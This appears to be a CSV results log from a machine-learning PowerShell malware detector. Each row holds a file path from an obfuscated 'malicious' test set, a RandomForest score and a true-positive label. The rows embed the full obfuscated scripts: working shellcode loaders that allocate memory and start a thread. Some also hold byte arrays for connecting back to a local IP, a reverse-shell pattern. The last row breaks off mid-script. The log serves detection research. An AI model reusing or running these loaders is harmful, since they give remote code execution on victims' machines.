ui','6,0x10,0x72,0xfd,0xd9,0xe5,0xc8,0xfc,0x09,0x55,0x47,0xb6,0xb1,0xdd,0x0f,0x67,0xc3,0x32,0x4c,0x5b,0x8a,0x3f,0xa6,0x2f,0x0d,0x96,0xf7,0xd0,0x3f,0xd6,0x5b,0xe','b,0x8b,0x71,0x22,0x20,0x','0x4a,0x45,0xf6,0x6e,0xb5,0x7','xtern IntPtr CreateThread(I','8,0x6a,0x62,0x85,0x43,0x3d,0x7d,0x30,0xe9,0xc2,0xeb,0xbe,0xb8,0x95,0x83,0xbc,0x9d,0xd2,0x0b,0x3f,0xc8,0x68,0x85,0xd5,0xb3,0x06,0xea,0x39,0x34,0xd7,0xbc,0x53,0x34,0xbf,0x18,0x07,0x67,0xda,0x66,0x92,0x1b,0x77,0xf3,0x1c,0x4a,0x2b,0x54,0x74,0x70,0x12,0x92,0xd','xb9,0x79,0x0b,0xa0,0xe8,0x4d,0x5f,0xe4,0x00,0x26,0x0d,0x1d,0x92,0x4a,0x9a,0x12,0','s -passthru;[Byte[]];[Byte[]]cstz = 0xda,0xc1,0xba,0xe0,0xef,0x','0a,0x80,0x84,0xa6,0x0b,0x6c,0x6a,0xd7,0x4c,0xc8,0xd3,0x7d,0x06,0xfb,','0x78,0x0','ad,0x9b,0x60,','rtAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadI','0x4','26,0xcd,0x2b,0x80,0x99,0x','0x00,0x07,0x45,0x94,0xe5,0x35,0x76,0x64,0x62,0x4e,0x05,0x56,0x2d,0xe4,0x81,0xda,0xa6,0x22,0x55',',0x1c,0x9d,0x92,0xc9,0xe3,0x1e,0xe2,0xc0,0x',',0x40);for (csti=0;csti -le (cstz.Length-1);csti++)','cstc ','0xac,0x68;cstg = 0x1000;if (cstz.Length -gt 0x1000){cstg = cstz.Length};cstx=cstw::VirtualAlloc(0,0x1000,cstg',' {cstw::memset([IntPtr](cstx.ToInt32()+csti), cstz[csti], 1)};cstw::CreateThread(0,0,cstx,0,0,0','5,0x45,0x88,0x2b,0x6','llImport(oilmsvcrt.dlloil)]public static extern IntPt','89,0xf4,0x41,0xe5,0x90,0x8f,0xf0,0xea,0x0f,0xea,0x33,0x60,0xa3,0x0a,0xfd,0x81,0xc','48,0x9f,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x49,0x83,0xee,0xfc,0x31,0x56,0x15,0x03,0x56,0x15,',',0xbc,0x53,0xdf,0x5b,0xd4,0x7b,0x',',0xbd','lkernel32.dlloil)]publi','x08,0xbb,0xa6,0xfc,0xc2,0xce,0xa7,0x39,0x3e,0x20,0xf5,0x92,0x34,0x93,0xe9,0x97,0x0','5a,0xbc,0xa0,0x50,0xe8,','nt flAllocationType, uint flProtect);[DllImport(oi','27,0x4a,0xb2,0x7a,0x81,0xf3,0x59,0x7b,0x2e,0x','f,0x8f,0xdb,0xa2,0x37,0x37,0x04,0xd1,','x13,0xe0,0xfc,0x1d,0xa4,0xc5,0xc0,0xf2,0x66,0x44,0xbd,0','x2c,0x0e,0x1c,0x59,0x48,0x9b,0xa3,0x8','= Epo[DllI','f,0xa0,0','9,0x28,0x08,','5,0xf9,0xa4,0xde,0x1f,0x03,0x2f,0x24,0xaa,0xba,0x51,0xce,0x56','d);[D','e,0x1',');for (;;){Start-sl','nt count);Epo;cstw = Add-Type -memberDefinition cstc -Name oilWin32oil -namespace Win32Function','eep 60};','3,0x4b,0xb9,0xe1,0x97,0x31,0x65,0x64,0x0a,0x91,0xee,0xde,0xee,0x23,0x22,0xb8,0x65,0x2f,0x8f,0xcf,0x22,0','0x02,0x1a,0xb4,0x77,0x4b,0xe')) -cREplAce([CHar]69+[CHar]112+[CHar]111),[CHar]39  -RePlacE  'oil',[CHar]34-cREplAce  ([CHar]99+[CHar]115+[CHar]116),[CHar]36) )",malicious,TP
2026-07-13 16:41:07,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1286.ps1,custom-ps-ml,UNKNOWN,f6492208-d710-4241-89a8-9958eba07102,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3169,1826.72,"iex (((\""{10}{55}{50}{1}{49}{62}{22}{58}{54}{19}{44}{9}{4}{20}{64}{30}{70}{51}{16}{75}{24}{6}{27}{17}{12}{32}{59}{21}{53}{43}{69}{18}{3}{2}{73}{40}{71}{8}{33}{42}{34}{5}{13}{52}{29}{25}{68}{57}{63}{7}{35}{0}{15}{45}{41}{48}{67}{37}{36}{47}{60}{66}{72}{61}{14}{26}{23}{38}{11}{46}{28}{39}{65}{74}{31}{56}\"" -f ',0x6a,0x00,0x6a,0x04,0x56,0','Alloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint ','0x8b,0x04,0x8b,0x0',',0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,','nt count);8bH;mPTw = Add-Type -me','0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0',',0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0','7,0x68,0x99,0xa5,0x74,0x61,0','x5f,0x5a,0x8','n IntPtr memset(IntPtr dest, uint src, ui','mP','ff,0xff,0x01,0xc3,',',0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01','xff,0xd5,0xb8,0x',',0','x','0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x0','d3','d,0x24,0x75,0xe4,0x58','nt dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThr','mberDefinit','ac,0xc1,0x','rnel32.dl','4d,0x61,0xff,0xd5,0x5e,0x5e,0xf',',0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78','0x50,0x50,0x50,0x50,0x40,0x50,0x','x68,0x75,0x6e,0x','x01,0x','x00,0x53,0xff,0xd5;mPTg = 0x100','0,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x02,0x68,0x02,0x00,0x1f,0x91,0x89,0xe6,','D9Win32KD9 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]mPTz = 0xfc,0',', mPTz[mPTi]',',0xd6,0x31,0','b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0','00,0x68,0x77,0x73,0x32,','xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00','6,0x8b,0x36,0x6a,0x40,0x68,0x00,','x3','f,0x0c,0x24,0xe9,0x71,0xff,0x','0;if (mPTz.Length -gt 0x1000){mPTg = mPTz.Length};mPTx=mPTw::VirtualAlloc(0,0x1000,mPTg,0x40);for','4,0x24,0x5b,0x5b,0','x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0x','x',',0xf6,0x03,0x7d,0x','eadId);[DllImport(KD9msvcrt.dllKD9)]public static exter','57,0x68,0','0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0','0x10,0x00,0x00,0x56,0x6a','f8,0x00,','flProtect);[DllImport(KD','Import(KD9kernel32.dllKD9)]public static extern IntPtr Virtual','0,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,','9','cf,0x0d,0x01,0xc7,0x38,0xe0,0x75','ttributes, ui','Tc = 8bH[Dll',', 1)};mPTw::CreateThread(0,0,mPTx,0,0,0);for (;;){Start-sleep 60};','50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0x','lKD9)]public static extern IntPtr CreateThread(IntPtr lpThreadA','xff,0x',',0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x0','0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57','9ke','d5,0x97,0x6a,0x10,0x56,0x5','ion mPTc -Name K',' (mPTi=0;mPTi -le (mP','2,0xd9,0xc8,0x5f,0xff,0xd5','0x7e,0','40,0x','f8,0x3b,0x7','xe8,0x82,0x00,0x00,0x00,0x6','x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0',',0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,','1,0xd0,0x89,0x44,0x2','Tz.Length-1);mPTi++) {mPTw::memset([IntPtr](mPTx.ToInt32()+mPTi)','2,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57')).rEPLAce('8bH',[STRInG][char]39).rEPLAce(([char]109+[char]80+[char]84),[STRInG][char]36).rEPLAce('KD9',[STRInG][char]34))",malicious,TP
2026-07-13 16:41:12,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1296.ps1,custom-ps-ml,UNKNOWN,79a89e24-b802-4266-a236-d6442112446d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3070,1797.92," . ( ([StRiNG]$verBoSEpREfERenCe)[1,3]+'X'-JOIn'') ( ((\""{64}{44}{72}{21}{38}{67}{71}{36}{6}{60}{0}{13}{12}{59}{29}{48}{53}{51}{18}{26}{31}{34}{39}{46}{61}{10}{33}{22}{50}{19}{47}{69}{66}{45}{35}{70}{56}{32}{43}{27}{11}{20}{16}{23}{55}{25}{24}{40}{8}{9}{37}{49}{58}{15}{65}{68}{14}{1}{5}{4}{42}{41}{3}{30}{62}{7}{52}{2}{17}{54}{28}{57}{63}\""-f 'utes, uint dwStackSize, IntPtr l','0xe7,0x6b,0x11,0x98,0xb7,0xcb,0xc1,0x58,0x68,0xa3,0x0b,0x57,0x57,0xd3,0x33,0xbd,0xf0,0','4,0x30,0x25,0x82,0x88,0xe6,0x03,0xf0,0xe','9e,0xea,0x1d,0x92,0xb5,0x12,0x88,0x19,0x1c,0x45,0x24,0x20,0x79,0xa1,0xeb,0xdb,0xac,0xba,0x22,0x4e,0x0f,0xd4,0x4a,0x9e,0x','0x15,0x45,0x31,0x22,0x','x79,0xdc,0x68,0xa8,','DllImport(KBWkernel32.dllKBW)]public static extern IntPtr CreateThread(IntPtr ',',0x','0x0a,0x88,0xc2,0x7f,0x27,0xd3,0x8a,0x4c,0x0a,0x','ec,0x4a','f,0x03','6,0x7f','tPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(KBWmsvcrt.dllKB','pStartAddress, In',',0x3e,0x01,0x3b,0xb9,0xb7,','0xc7,0','x1d,0xc7,0x80,0xb6,0x60,0xe8,0x72,0xc6,0xa5,0xce,0x6c,0xbd,0xdf,0x2d,0x10,0xc6,0x1b,0x4c,0xce,0x43,0xb8','0,0x3a;O7lg = 0x1000;if (O7lz.Length -gt 0x1000){O7lg = O7lz.Length','finition O7loTvt -Name KBWWin32KBW -namespace Win32Function','0x97,0xb9',',0x19,0','alAlloc(Int','6e,0',',0xf6,0x','x0f,0xb9,0x25,0xc3,0x2b,0x32,0xc8,0x04,0','2,0xee,0x0b,0x26,0xe0,0xa8,0','s','0x85,0x0a,0x8d,0x45,0x27,0xdf,0xa5,0xcf,0x3f,0x3c,0x83,0x86,0xb4,0xf',' -le (O7lz.Length-1);O7li++) {O7lw::memset([IntP',' extern Int','8f,0x24,0x1d,0xf4,0x8f,0x4c,0xf9,0xac,0xc3,0x69,0x06,0x79,0x70,0x22,0x93,0x82,0x21,0x97,0x34,0',' -passthru;[','1,0xd',',0x55,0x4d,0x','Byte[',',0x4d,0xbe,0xfd,0x30,0xe6,0x75,0xd8,0x7f,0xf7,0x26,0x18,0xe1,0x7b,0x35,0x4d,0xc1,','ect);[',',0xdb,0x1d,0x9f,0x78,0x44,0xb6,0x37,0x30,0x0d,0x10,0xcf,0x37,0x24,0','Ptr lpAddress, uint dwSize, uint flAllocation',']];[Byte[]]O7lz = 0xba,0','xba,0x00,0xef,0x80,0xe7,0xd3,0x8e,0x91,0x4d,0xb5,0xaf,0xc2,0x2e,0x6a,','4,0x','84,0x8a,0xef,0x4e,0x86,0x01,0x1c,0xae,0x48,0xe2,0x69,0xbc,0x3c,0x02,0x2','2,0x45,','T','21,0x73,0x8a,0xb6,0xca,0xd1,0x3f','x42,0x8c,0x13,0x6b,0xdb,0xc',',0xec,0x09,0x68,0x39,0x91,0x80,','Ptr memset(IntP','xe4,0x5f,0xc','xe6,',' uint count);AYu;O7lw = Add-Type -memberDe','b','tr dest, uint src,','};O7l6bu=O7lw::VirtualAlloc(0,0x1000,O7lg,0x40);for (O7li=0;O7li','85,0xf4,0x64,0x07,0x49,0x6','0x7','tr](O7l6bu.ToI','6,','W)]public static','lpThreadAttrib','8,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x55,0x0','xeb,0xcf,0xce,0x73','nt32()+O7li), O7lz[O7li], 1)};O7lw::CreateThread(0,0,O7l6bu,0,0,0);for (;;){Start-sleep 60};','O7lo','x15,0x49,0x0c,0x93,0x45,0xe1,0x',',0xc6,0x3a,0x','Type, u','a5,0x9c,0x0d,0xf1,0x4a,0x49,0xbb,0xf4,0xdc,0x78,0x3c,0xfd,0x12,0x15','0x8d,0x08,0x91,0xf7','0x42,0xf6,0x80,0x00,0x83,0xeb,0x69,0x50,0x5c,0x67,0xdf,0x45,0xe9,0x3d,0xdc,0xee,0xa1,0xd0,0x64,0x12,','int flProt','vt = AYu[DllImport(KBWkernel32.dllKBW)]public static extern IntPtr Virtu')).rEplAce('KBW',[sTrInG][cHar]34).rEplAce('O7l','$').rEplAce(([cHar]65+[cHar]89+[cHar]117),[sTrInG][cHar]39) )",malicious,TP
2026-07-13 16:41:27,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1299.ps1,custom-ps-ml,UNKNOWN,c38b4ee9-bd11-4cdb-93e0-5fad6a472092,DESKTOP-BAC9DBQ,malicious,0.9941,RandomForest,3105,1696.8,"&amp; ( $PShoME[4]+$PShoME[34]+'x') ( ((\""{44}{39}{14}{48}{3}{61}{15}{22}{1}{51}{28}{33}{34}{40}{24}{69}{49}{23}{21}{58}{71}{45}{32}{19}{64}{7}{12}{36}{31}{63}{66}{2}{62}{41}{47}{38}{20}{0}{10}{50}{65}{13}{72}{25}{8}{27}{60}{16}{54}{4}{9}{56}{42}{11}{67}{70}{68}{55}{37}{35}{46}{5}{57}{30}{52}{18}{29}{53}{43}{6}{17}{59}{26}\""-f ',0xef,0x30,0xaa,0x41,0x64,0xb7,0x7d,0xc0,0x3e,0x9c,0x59,0x89,','Ptr lpStartAddress, IntPtr','x2d,0x38,0x61,0x6f,0x62,0x9a,0x58,0xa0,0x77,0xdb,0x9d','int flProtect);[DllImport(hFfkernel32.dllhFf)]public static extern IntPtr CreateThr',',0x71,',',0x40,0xea,0x2','qoi], 1)};mqow::CreateThread(0,0,mqo','0,0x4f,0','a,0xa9,0','0x00,','0xe5,0xbd,0xf','xac,0xf0,0x4a,0x55,0','x47,0x7e,0xa5,0x','x50,0xde,0xc7,0x05,0',' lpAddress, uint dwSize','ibutes, u','f8,0x4f,0x4b,0x5a,0xa','x,0,0,0);','0;mqoi -le (mqoz',',0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xed,0x97,0x23,0','1,0x3d,0x1d,0x03,0x97,0xb6,0x11,0xe8,0xd3,0x91,0x35','e[]];[Byte[]]','int dwStackSize, Int','ctions -passthru;[Byt','memset(IntPtr dest, uint src, uint count);HRL;mqow = Add-Type -','x21,0xf2,0xf2,0x38,0xdc,0xfd,0x02,0x10,0x1','or (;;){Start-sleep 60};','x52,','ameter, uint dwCre','.',',0xaa,0x20,0x23;mqog = 0x1000;if (mqoz.Length -gt 0x1000){mqog = mqoz.Length};mqox=mqow::VirtualAlloc(0,0x1000,mq','0x47,0xe4,0xad,0xd0,0x77,0x6e,0xe3,0xdc,0xfc,0x22,0x','0x00,0x44,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47','a','tionFlags, IntPtr lpTh','x58,0x93,0x38,0x43,','7e,','4,0x77,0x1b,0xa2,0x6c,0x24,0x3e,0xad,0xb8,0',',0xc2,0x3a,0x04,0x51,0xd1,0x9c,0xcf,0xc',']public static extern IntPtr VirtualAlloc(IntPtr','readId);[DllImport(hFfmsvcrt.dllhFf)]public static extern IntPtr ','0x1c,0x53,0x73,0xfe,0x','fc,0xe6,0x08,0x35,0xa9,0xb1,0xa4,0','tr](mqox.ToInt32()+mqoi), mqoz[m','mqoc = HRL[DllImport(hFfkernel32.dllhFf)','ce,0xb8,0x6b,0xc1,','0x09','f1,0xef,0x3a,0x18,0x16,0xd5,0xf5,0x93,0xec,0xa1,0x07,0x72,0x3d,0x49,0xab,0xbb,0xf2,0xb8,0xb5,0xfc,0x34,0x23,0xc0,0xf4,0x47,0xde,0xd3',', uint flAllocationType, u','in32Fun','8,0x77,0x4b,0xc1,0x1b,0xd8,0x34,0x67,0x57,0xf4,0x21,0x1a,0x3a,0x90,0x86,0x17,0xc5,0x60,0x81,0x20,0xb6,0x52,0x0e,',' lpPar','og,0x40);for (mqoi=','Length-1);mqoi++) {mqow::memset([IntP','9,0x27,0x81,0x55,0x96,0x58,0xaa,0xbc,0xbf,0xf3,0x50,0x56,0x81,0x6c,0xfe,0x1d,0x69','0x76,0x63,0xa4,0x5e,0x77,0x73,0xf2,0x3','0x60,0xd1,0x','b,0xb7,0xbf,0xdc,0xf3,0x48,0xea,0xdc,0xc8,0x9e,0xd2','mqoz = 0xd','f','0x0a,0x8b,0xd2,0x38,0xca,0x34,0x07,0xee,0x9a,0x9a,0x','ead(IntPtr lpThreadAttr',',0xdd,0x7a,0x89,0x76,0xa9,0x29,0x3e,0xf3,0xe7,0xf1,0xb5,0x4f,0xe9,0x71,0x29,0x07,0x08,0x53,0xfc,','10,0x57,0x70,0xeb,0x17,0xd0,0x3f,0xcd,0x16,','xf5,0xb8,0x8f,0x26,0xf6,0x4','0x9b,0','0xe1,0x6c,0','x30,0x2f,0x37,0x55,0xba,0xdc,0xc','x70,0x52,0x1a,0xb5,0x0b,0x5b,0x8e,','memberDefinition mqoc -Name hFfWin32hFf -namespace W','7,0x1b,0x4b,0xa8,0xdb,0xcb,0xbb,0xe7,0x86,0x5d,0xc3,0xdd,0xad,0x61,0x51,0xda,0x67,0x36,0xcd,0xe0,0x5e,0','b,0x','xa6,0')).replaCe(([cHAr]72+[cHAr]82+[cHAr]76),[STRINg][cHAr]39).replaCe(([cHAr]104+[cHAr]70+[cHAr]102),[STRINg][cHAr]34).replaCe(([cHAr]109+[cHAr]113+[cHAr]111),[STRINg][cHAr]36))",malicious,TP
2026-07-13 16:41:40,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\13.ps1,custom-ps-ml,UNKNOWN,e0fd41c5-2b85-4004-9d6a-faa45191f958,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2792,1476.3," ((\""{45}{27}{34}{8}{25}{10}{1}{41}{30}{21}{35}{5}{40}{15}{20}{28}{22}{38}{13}{6}{18}{14}{24}{37}{26}{46}{36}{16}{29}{7}{42}{0}{31}{33}{23}{9}{44}{11}{32}{2}{12}{17}{43}{19}{39}{4}{3}\""-f 'f,0xd5,0x97,0x6a,0x05,0x6','Nl)]public static extern IntPtr memset(IntPtr','0x57,0x68,0x02,0xd9,','bsc[FQbi], 1)};FQbw::CreateThread(0,0,FQbx,0,0,0);for (;;){Start-sleep 60};','i), FQ','ctions -passthru;[Byte[]]','x8b,0x01,0','68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff','llDNl)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lp','0x99,0xa5,0x74,0x61,0xff,0xd5,0x','[DllImport(DNlmsvcrt.dllD','x6a','0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0','xe3,0x3c,0x49,0x8b,0x34,0',',0x38,0xe0,0x75,0xf4,0x03,0x7d,0x',',0x3','0x61,0x59,0x5a,0x51,0xff,','xec,0xc3;FQbsize = 0x1000;if (FQbsc.Length -gt 0x1000){FQbsize = FQbsc.Length};FQbx=FQbw:','xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7',',0x40);for (FQbi=0;FQbi -le (FQbsc.Length-1);FQbi++) {FQbw::memse','1,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x5','e -membe','01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0x','1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,','f8,0x3b,0x7d,','StartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);','66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,','mport(DNlkernel32.dllDNl)]public static extern IntPtr VirtualAlloc(IntPtr lpAddr','7,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x','0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x','bw = Add-Typ','8,0xc0,0xa8,0x01',',0x00,0x6a,0x04,0x56,',',0x37,0x68,0x02,0x00,0x0','ess, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(DNlkernel32.d','rDefinition FQbc -Name DNlWin32DNl -namespace Win32Fun','x5b,0x5b,','0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x','d3,0','t([IntPtr](FQbx.ToInt32()+FQb',';[Byte[]]FQbsc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff',' dest, uint src, uint count);qpO;FQ',',0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xf',':VirtualAlloc(0,0x1000,FQbsize','85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0','FQbc = qpO[DllI','0xd0,0x89,0x44,0x24,0x24,0')).REpLAcE('qpO',[StRInG][char]39).REpLAcE('DNl',[StRInG][char]34).REpLAcE(([char]70+[char]81+[char]98),'$')|&amp; ((VARIaBle '*MDR*').NAme[3,11,2]-JoIN'')",malicious,TP
2026-07-13 16:41:47,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1305.ps1,custom-ps-ml,UNKNOWN,2e5567e4-3025-4643-9de7-c0d246917a01,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3052,1639.61," (((\""{47}{9}{27}{51}{68}{19}{14}{46}{41}{38}{49}{60}{35}{61}{34}{53}{63}{1}{44}{39}{36}{11}{72}{69}{3}{31}{50}{43}{33}{12}{62}{32}{66}{6}{13}{59}{57}{37}{54}{71}{21}{29}{22}{58}{10}{17}{70}{7}{4}{45}{8}{26}{56}{24}{25}{2}{23}{55}{30}{65}{67}{28}{20}{42}{52}{40}{0}{5}{16}{48}{18}{64}{15}\""-f':VirtualAlloc','2SH8 -namespace Win32Functions -passthru;[Byte[]];[Byt','xfb,0x10,0x31,0x1c,0x91,','0x69,0xf7,0xbc,0x08,0xf9,0xa7,0x0c,0x5a,0xaf,0x4b,0xe6,0x0e,0x44,0xd8,0x8a,0x86,0x','a,0xc8','(0',',','0xea,0xa','c0,0x13,0x29,0x5e,0xbd,0x1d,0xa1,0x36,0xbc,0x1d,0xa5,0xa0,0x49,0','P6g[DllImport(SH8ke','xfe,0x5e,0xd5,0xa7,0xa1,0x3f,0x73',',0x47,0x31,0x58,0x18,0x83,0xe8,0xfc,0x03,0x58,0x','0xd1,0xaa,0','0x64,0xe8,0x85,0x01,0x36,0xfc,0x8d,0xf6,0x8e,0xff,','uint flProtec',');for (;;){Start-sleep 60};',',0x1000,WcOg,0x40);for (WcOi=0;WcOi',',0xa3,0x4f,0x2b,0x0e,0xee,0x07,0x98,0x23,0x11,0xd7,0xb6,0x34,0x62,0xe5,0x19,0xef,0','r](WcOiO34.ToInt32()+WcOi), WcOz[WcOi], 1)};WcOw::CreateThread(','e, ','d4,0x2e',',0xbb,0x58,0xd4,0xb8,0','f,0x7e,0xc3,0x31,0x65,0x65,0x63,0xb1,0xdd,0x41,0x92,0x16,0xbb,0x02,0x98,0xd3,0xcf,0x4d','0x9c,0xa7,0x9b,0x30,0xcb,0x5f','x6f,0x51,0xb3,0x07,0x0e,0x9e,0x69,0x62,0x10,0x','14,0x9e,0x92,0xde,0xdd,0xeb,0x80,0xb6,0x2d,0xa6,0','xfb,0x95,0x7c,0x1a,0x54,0x55,0x2d,0xda,0x04,0x3d,0x27,0xd5,0x7b,0x5d,0x48,0x3f,0x14,0xf7,0xa7,0x96,','rnel32.dllSH8)',',0xae,0x60,0x4a,0xac,0xc6,0x','xb8,0xe5,0xe','0xa6,0x65,0x3b,0xc0,','6b,0x69,0x20,','x16,0xd6','xe8,0x60,0x16,0x26,','ount);P',');[DllImport(SH8msvcrt.dllSH8)]public static extern IntPtr memset(In','8f,0x33,0xc9,0xb1','0xab,0xf3,0x39,0xb2,0x54,0x5f,0','n IntPtr CreateThread(IntPtr lpThreadAttributes, ui',']WcOz = 0xd9,0xc0,0xd9,0x74,0x24,0xf4,0x58,0xbb,0xca,0xb7,0xec,0x',' WcOz.Length};WcOiO34=WcOw:','llImport(SH8kernel32.dllSH8)]public static exter',',0xff,0xf3,0x1a,0xfb,0x93,0xa8,0x8e,0x04,0xc2,0x1d,0x18,0x6d,0xe8,0x78,0x6e,0x32,0x13,0xaf,0x6e,0x0e,0xc2,0x89,0x04,0x7e,0xd6;WcOg = 0x1000;if (WcOz.Length -gt 0x100','x19,0xc1,0xc5,0','e[]',',0x8e,0x64,0x55,0xf3,0xee,0xad,0x91,0xa7,0xbe,0xc5,0x30,0xc8,0x54,0x16,0xbd,0x1d,0x','t);[D','WcO8KN8nB = ',' -le (WcOz.Length-1);WcOi++) {WcOw::memset([IntPt','nt dwStackSize, IntPtr lpS','0xf1,0x42,0x6a,0',']public static extern IntPtr VirtualAlloc(IntPtr lpA','0){WcOg =','6g;WcOw = Add-Type -memberDefinition WcO8KN8nB -Name S','x04,0x7',',','0x4c,0','xe1,0xef,0x7b,',',0xbc,0xe2,0x1c,0xe6,0xb8,0x6f,0xa3,0x29,0x49,0x2b,0x80,0xed,0x12,0xef,0xa9,0xb4,0','0xbc,0xa8,0x85,0x59,0x1f,0x4a,0x4a,0xd2,0x16,0x54,0x8f,0xdf,0','tartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId','tPtr dest, uint src, uint c','x6b,0x27,0','H8Win3','0,0,WcOiO34,0,0,0','0x59,0x40,0x30,0xc9,0xcf,',',0x86,0x75,0xcf,0x9c,0x35,0x6a','0x2b,0x2e,0x36,0x00,0xac','ddress, uint dwSize, uint flAllocationTyp','x73,0x36,0x1b,0xe2,0x8c,0xc6,0x7c,0x6a,','xec,0x45,0xd1,0x29,','b,0xa7,0xa1,0x40','de,0x55,0x19,0'))-CrEPlAce'SH8',[Char]34-repLace'WcO',[Char]36  -repLace([Char]80+[Char]54+[Char]103),[Char]39) | &amp;((gv '*mdR*').NaME[3,11,2]-JoiN'')",malicious,TP
2026-07-13 16:41:50,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1340.ps1,custom-ps-ml,UNKNOWN,547a112f-2ddf-42c8-8a0e-7a310cbf9b13,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2897,1616.75,"(((\""{43}{36}{41}{24}{45}{30}{13}{21}{3}{23}{0}{1}{19}{17}{48}{40}{27}{8}{12}{29}{6}{5}{33}{11}{38}{7}{26}{46}{44}{39}{15}{20}{25}{2}{47}{9}{28}{18}{16}{4}{37}{32}{22}{34}{35}{31}{10}{42}{14}\"" -f 'assthru;[Byte[]];[Byte[]]0S4z = 0xb8,0xb4,0xd8,0xa2,0x91,0xdb,0xc6,0xd9,0x74,0x24,0xf4,','0x5f,0x31,0xc',',0xf2,0x16,0x0d,0xaa,0x67,0xff,0x4c,0xab,0x72,0x4c','t, uint src, uint count);9RL;0S4w = Add-Type -memberDefinition 